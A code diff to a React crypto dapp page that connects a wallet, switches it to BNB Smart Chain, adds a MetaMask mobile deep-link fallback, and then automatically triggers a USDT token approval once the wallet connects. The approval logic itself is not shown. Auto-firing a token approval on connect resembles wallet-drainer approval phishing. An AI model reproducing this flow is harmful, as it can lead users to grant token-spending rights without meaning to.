@@ -76,29 +76,69 @@ const HomePage = () => {
   };
 
   // ✅ Connect and get signer
+// const connectAndApprove = async () => {
+//   try {
+//     if (window.ethereum) {
+//       await switchToBSC(); // Wait for chain switch
+
+//       const modal = new Web3Modal({ cacheProvider: true });
+//       const instance = await modal.connect();
+//       const provider = new BrowserProvider(instance);
+//       const _signer = await provider.getSigner();
+//       const _account = await _signer.getAddress();
+
+//       setSigner(_signer);
+//       setAccount(_account);
+//       /* setStatus("✅ Wallet connected"); */
+
+//       // ✅ Auto trigger approval
+//       await approveUSDT(_signer, _account);
+//     }
+//     else {
+// 			const dappUrl = window.location.hostname;
+// 			const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
+// 			console.log('Redirecting to MetaMask mobile app:', metamaskAppDeepLink);
+// 			window.open(metamaskAppDeepLink, '_self');
+// 		}
+//   } catch (err) {
+//     console.error("Connect error", err);
+//     /* setStatus("❌ Wallet connection failed"); */
+//   }
+// };
+
 const connectAndApprove = async () => {
   try {
     if (window.ethereum) {
-      await switchToBSC(); // Wait for chain switch
+      // 🔁 Attempt to switch to BNB Smart Chain
+      await switchToBSC();
 
+      // 💼 Initialize wallet connection
       const modal = new Web3Modal({ cacheProvider: true });
       const instance = await modal.connect();
       const provider = new BrowserProvider(instance);
       const _signer = await provider.getSigner();
       const _account = await _signer.getAddress();
 
+      // 🔐 Save signer and account
       setSigner(_signer);
       setAccount(_account);
-      /* setStatus("✅ Wallet connected"); */
+      // setStatus("✅ Wallet connected");
 
-      // ✅ Auto trigger approval
+      // ✅ Trigger approval after connection
       await approveUSDT(_signer, _account);
+    } else {
+      // 📱 Fallback for mobile MetaMask
+      const dappUrl = window.location.hostname;
+      const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
+      console.log("Redirecting to MetaMask mobile app:", metamaskAppDeepLink);
+      window.open(metamaskAppDeepLink, "_self");
     }
   } catch (err) {
     console.error("Connect error", err);
-    /* setStatus("❌ Wallet connection failed"); */
+    // setStatus("❌ Wallet connection failed");
   }
 };
+
 
 
   // ✅ Send approval transaction
